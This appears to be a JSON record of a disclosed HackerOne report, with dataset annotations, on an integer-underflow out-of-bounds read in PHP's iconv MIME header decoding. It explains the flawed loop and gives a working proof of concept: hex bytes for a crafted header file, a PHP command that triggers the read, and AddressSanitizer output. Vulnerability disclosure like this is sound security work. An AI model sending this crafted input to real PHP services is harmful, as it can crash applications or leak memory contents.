{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "neural_x ",
  "title": "Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow",
  "content": "\nPHP upstream bug report: https://bugs.php.net/bug.php?id=78069\nDescription:\nIn _php_iconv_mime_decode() function in iconv.c, there's an out-of-bounds read due to an integer overflow vulnerability. MIME encoded string is being parsed and decoded in for loop with following condition:\nCode 61 Bytes\n1for (str_left = str_nbytes; str_left > 0; str_left--, p1++) {\nInside this for loop, it's possible for str_left to be decreased and p1 to be increased at the same time when scan_stat is equal to 2 (i.e. case 2 branch of the switch) and the given character set is unrecognized and ICONV_MIME_DECODE_CONTINUE_ON_ERROR is specified, so it continues to parse the message. It will then try to skip the encoded word by searching for the other two '?' characters while increasing p1 and decreasing str_left:\nCode 120 Bytes\n1int qmarks = 2;\n2while (qmarks > 0 && str_left > 1) {\n3    if (*(++p1) == '?') {\n4        --qmarks;\n5    }\n6    --str_left;\n7}\nIf the while condition is stopped, it will proceed to the next condition that checks if the next character is '=' and if it is, p1 is increased again and str_left is decreased:\nCode 51 Bytes\n1if (*(p1 + 1) == '=') {\n2    ++p1;\n3    --str_left;\n4}\nHowever, if the previous while loop was stopped due to str_left being equal to 1, it is now decreased to 0. The encoded string is copied to 'pretval' variable and if it doesn't error out, it will properly set scan_stat and break:\nCode 22 Bytes\n1scan_stat = 12;\n2break;\nThe for loop is being run from start again, but before checking the condition 'str_left > 0', it is first decreased. Since it was already equal to 0 and it is defined as size_t (i.e. unsigned integer), it will overflow to very huge positive number. At this point, the code will continue to read from p1 out of bounds and copy it to 'pretval'.\nPoC:\nCode 1006 Bytes\n1$ echo \"53754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f69730d0d0d0d0d0d0d0d0d0d0d0d0d0d0d6563743a203d3f6973754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f6f2d383835392d313f713f3c334633463d33463f3da2\" | xxd -r -p - > poc\n2\n3$ sha256sum poc\n4c471fb3e1511897d3fda9095e0eb85c934532a207f30ac99f0e7d58c42916e4b  poc\n5\n6$ USE_ZEND_ALLOC=0 sapi/cli/php -r '$hdr = iconv_mime_decode_headers(file_get_contents(\"poc\"),2);'\n7=================================================================\n8==26444==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000005a8 at pc 0x000000a2ee39 bp 0x7ffcc313a470 sp 0x7ffcc313a460\n9READ of size 1 at 0x60d0000005a8 thread T0\n10    #0 0xa2ee38 in _php_iconv_mime_decode /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965\n11    #1 0xa332c6 in zif_iconv_mime_decode_headers /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:2409\n12    #2 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690\n13...\nThis issue affects all current stable releases, namely PHP-7.1.29, PHP-7.2.18, and PHP-7.3.5. Tested on Fedora 28, PHP code was compiled with ASAN. It is possible to observe the bug also with valgrind without the necessity of compilig php with ASAN.\nImpact\nRemote attacker can submit specially crafted MIME format message (email) which triggers the vulnerability in the parsing code when decoding MIME headers. Possible impact is crash of the application or even information leak, depending on the further usage of the decoded header since it contains the data from memory outside of allocated string. The exact behaviour depends on the content of the memory after 'str' buffer.\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": 1500,
  "weaknesses": [
    "Buffer Over-read"
  ],
  "screenshots": {},
  "disclosed_date": 1602514260,
  "report_url": "https://hackerone.com/reports/593229",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a specially crafted MIME format message (email) with a specific pattern that triggers the integer overflow vulnerability in the parsing code."
    ],
    [
      2,
      "Use the crafted message with the `iconv_mime_decode_headers` function in PHP to trigger the out-of-bounds read and potential crash or information leak."
    ]
  ],
  "vuln_description": "The vulnerability is an out-of-bounds read in the `_php_iconv_mime_decode()` function in `iconv.c` due to an integer overflow. When parsing and decoding a MIME encoded string, the function can enter a state where an unsigned integer variable (`str_left`) overflows, leading to an out-of-bounds read. This can result in a crash or information leak, depending on how the decoded header is used.",
  "reason": "This vulnerability involves understanding the parsing logic of MIME headers in PHP, including the handling of character sets and error conditions. The attacker needs to craft a specific input that triggers the integer overflow and subsequent out-of-bounds read. The interaction between the parsing loop, error handling, and integer overflow is subtle and non-obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}